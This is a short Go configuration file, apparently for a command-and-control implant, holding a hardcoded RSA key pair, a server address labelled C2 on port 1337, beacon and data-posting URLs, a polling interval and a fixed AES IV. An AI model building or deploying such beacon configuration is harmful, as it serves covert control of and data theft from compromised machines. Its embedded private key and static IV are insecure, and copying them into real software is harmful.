package config

import (
	"time"
)

var (
	RsaPublicKey = []byte(`
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCNNfyYxI05G7wVyrPcLJwHcrlV828WBbD34uOy
+yJHDo+8sebPNgq80kT0YM2zI6JKGA6h4Kc7rTzf1IwwsS+VZagNH6Thpx3/OcBUkvoFGRhlnBxK
PBV+f3KJsAbIdwop/vQudh3XgPszml4ikZd+iHdPBpys4Brn3dQj8LGY2QIDAQAB
-----END PUBLIC KEY-----	
	`)
	RsaPrivateKey = []byte(`
-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAI01/JjEjTkbvBXKs9wsnAdyuVXz
bxYFsPfi47L7IkcOj7yx5s82CrzSRPRgzbMjokoYDqHgpzutPN/UjDCxL5VlqA0fpOGnHf85wFSS
+gUZGGWcHEo8FX5/comwBsh3Cin+9C52HdeA+zOaXiKRl36Id08GnKzgGufd1CPwsZjZAgMBAAEC
gYAZTfNV7OLhuPabcReJ/PR44TYVEOp3J83undnv2NDrqtBXIAocV7LU41k38aDq2Rfb7zOwDnHp
X8Ho2k3E6/t6pJ7m6WfzUE/wwjtwtV3jR5l2mO2j4kQDIdEZuY2jILyPHSNI9T73CfhQax3paz35
0bW7iFNatGccgBqb2dyxgQJBAOfqx187FY89gBY8yr3eaoa2bo5UikEGQtOVywfPv5snbFHGxoAu
DD0BCyrsKxzm5KPHNLyNyGZddTndh5zLW+8CQQCb3+YBqKXllSNdJPTjcCrYNVx+sMzjK7cCnV13
OeWrEG79sRwXPwvxVPYjGaDCp2w19kQvOhMKylUvqqqHri+3AkEAkR2ngz9FTkv9SezgL85seb7N
juH3YJi6WAry8ABetIcGkGUA8FPf9IwioMkGcR9JEfIkXZeaPfNc1sh3gvT8oQJAZ+ALjWtwMtDy
Yi4wrCihxLe6zgrQX0tQiIOKN9vze85VyOZwS+WN9eOiq712boHYERXuVnKjIfu4TS20uvqPfQJB
AL+XPa7vtiBCRIKvLoDN53ReezN2+jSQCA8ZbW4IswNY/ErQ3UP6GZQNeU/7QsDSYLzZNY30RZrF
OFmo2t6mOkM=
-----END PRIVATE KEY-----	
	`)


	C2        = "172.17.0.1:1337"
	plainHTTP = "http://"
	sslHTTP   = "https://"
	GetUrl    = plainHTTP + C2 + "/api/v1/status"
	PostUrl   = plainHTTP + C2 + "/api/v1/entry?id="
	WaitTime  = 10000 * time.Millisecond
	VerifySSLCert = true
	TimeOut time.Duration  = 10 //seconds

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
)

const (
	DebugMode = true
)
